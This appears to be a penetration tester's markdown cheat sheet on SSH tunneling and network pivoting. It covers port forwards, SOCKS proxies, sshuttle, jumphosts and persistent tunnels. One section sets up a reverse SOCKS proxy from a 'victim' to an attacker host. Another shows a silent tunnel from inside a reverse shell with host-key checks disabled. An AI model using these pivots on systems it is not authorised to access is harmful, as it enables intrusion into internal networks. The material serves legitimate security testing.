---
title: "SSH Tunneling"
---

# 🌐 SSH Tunneling

## 📚 Resource

- [Pivoting Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)

## 📦 Basic Tunnels

### SSH Local Forward (client -> remote)

```bash
# Forward local port to remote host
ssh -L [$BIND_ADDRESS:]$LPORT:127.0.0.1:$RPORT $USER@$RHOST
```

### SSH Remote Forward (remote -> client)

```bash
# Forward remote port back to local
ssh -R [$BIND_ADDRESS:]$RPORT:127.0.0.1:$LPORT $USER@$RHOST
```

### Dynamic forward (SOCKS proxy)

```bash
# Create a SOCKS proxy on a local port (e.g. 1080)
ssh -D $SOCKS_PORT $USER@$RHOST
```

```bash
[Local Machine]
    |
    |-- HTTP request --> localhost:1080 (SOCKS proxy)
                                |
                                v
                        [SSH Tunnel Established]
                                |
                                v
                        [Remote Host (user@remote_ip)]
                                |
                                |---> Request sent to Website
                                        |
                                        v
                                <--- Response from Website
                                |
                                v
                        Response sent back through SSH tunnel
                                |
                                v
                      [Local Machine receives response]
```

## sshuttle

> Transparent proxy. No need for proxychains. Routes traffic at IP level.

### Basic usage

```bash
# Route specific subnets through SSH
sshuttle -r $USER@$RHOST 10.0.0.0/8 172.16.0.0/12
```

### Common options

```bash
# Auto-detect subnets from remote host
sshuttle -r $USER@$RHOST -N

# Custom SSH port
sshuttle -r $USER@$RHOST:2222 $SUBNET_TARGET/$NETMASK_TARGET -v
sshuttle -r $USER@$RHOST:2222 $SUBNET_1/$NETMASK_1 $SUBNET_2/$NETMASK_2 $SUBNET_3/$NETMASK_3 -v # Multiple subnet

# Exclude specific subnet (split tunnel)
sshuttle -r $USER@$RHOST $SUBNET_TARGET/$NETMASK_TARGET -v --exclude 10.0.0.5/32

# Daemon mode (background)
sshuttle -r $USER@$RHOST $SUBNET_TARGET/$NETMASK_TARGET -v -D
```

## 🔗 Double tunnel via jumphost

```bash
# Local forward through jumphost
ssh -J $JUMP_USER@$JUMP_HOST -L $LPORT:$TARGET_HOST:$RPORT $TARGET_USER@$TARGET_HOST

# With ProxyJump option
ssh -o ProxyJump=$JUMP_USER@$JUMP_HOST -L $LPORT:$TARGET_HOST:$RPORT $TARGET_USER@$TARGET_HOST
```

## 🔄 Reverse dynamic SOCKS (victim → attacker)

```bash
# On victim: push SOCKS back to attacker
ssh -R $LPORT $ATTACKER_USER@$ATTACKER_HOST

# On attacker: use it with proxychains
proxychains -q curl http://internal.target
```

## 🧰 MISC

### ⚙️ Useful options

```bash
-o UserKnownHostsFile=/dev/null     # Don't record host key
-o StrictHostKeyChecking=no         # Automatically accept new host keys
-o BatchMode=yes                    # Disable password prompts (fail if no key)
-N   # No remote command, just forward
-f   # Background after auth
-n   # Redirects stdin (helps with -f)
```

```bash
# Example: silent tunnel in unstable reverse shell
ssh -n -i $(mktemp -d) \
    -o UserKnownHostsFile=/dev/null \
    -o BatchMode=yes \
    -o StrictHostKeyChecking=no \
    -N -R $RPORT:127.0.0.1:$LPORT $USER@$RHOST
```

> Tip: These options are useful if you can’t interactively enter a password (e.g. during a reverse shell). Combine with key-based auth.

```bash
# Use password from file
sshpass -f password.txt ssh $USER@$RHOST
```

### 🛡️ SSH Server config reminders

**File:** `/etc/ssh/sshd_config`

```bash
GatewayPorts yes         # Allow -R to bind to all interfaces
AllowTcpForwarding yes   # Enable port forwarding
```

### 🔁 Persistent tunnel

```bash
# Auto-reconnect if dropped
autossh -M 0 -N -f -L $LPORT:127.0.0.1:$RPORT $USER@$RHOST

# Or keep it running in background with nohup (less robust)
nohup ssh -N -L $LPORT:127.0.0.1:$RPORT $USER@$RHOST &
```
